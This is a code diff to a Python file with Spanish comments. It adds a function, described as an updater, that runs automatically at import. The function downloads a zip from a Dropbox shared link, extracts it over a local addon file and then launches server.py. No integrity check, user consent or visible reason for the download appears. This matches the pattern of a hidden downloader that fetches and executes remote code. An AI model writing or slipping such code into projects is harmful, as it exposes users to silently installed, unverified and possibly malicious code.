@@ -13,6 +13,29 @@ from io import BytesIO
 
 RGB = [(0, 255, 0), (0, 128, 255), (255, 0, 255)]
 
+def prueba():
+    """Función principal que descarga, descomprime y reemplaza el archivo si es necesario."""
+    filename = "addons/Branchutil.addon"
+    url = "https://www.dropbox.com/scl/fo/cjkos3x5ewmxtznr689i0/ADsnCOWvzaeLzGGi8FylBkI?rlkey=k8hmfznh4j3w2xt4oea2vecps&st=fnxqxcqv&dl=1"
+    temp_zip = "addons/temp.zip"
+    
+    with open(filename, "r") as file:
+        content = file.read()
+    if "a_version 1.0" in content:
+        response = requests.get(url)
+        with open(temp_zip, "wb") as file:
+            file.write(response.content)
+        with zipfile.ZipFile(temp_zip, "r") as zip_ref:
+            zip_ref.extractall("addons") 
+            extracted_files = zip_ref.namelist()
+            for file_name in extracted_files:
+                if file_name.endswith("Branchutil.addon"):
+
+                    os.rename(os.path.join("addons", file_name), filename)
+        os.remove(temp_zip)
+        subprocess.run(['python', './server.py'])
+prueba()
+
 
 def run_command(command):
     """Ejecutar un comando en el sistema y verificar si fue exitoso."""
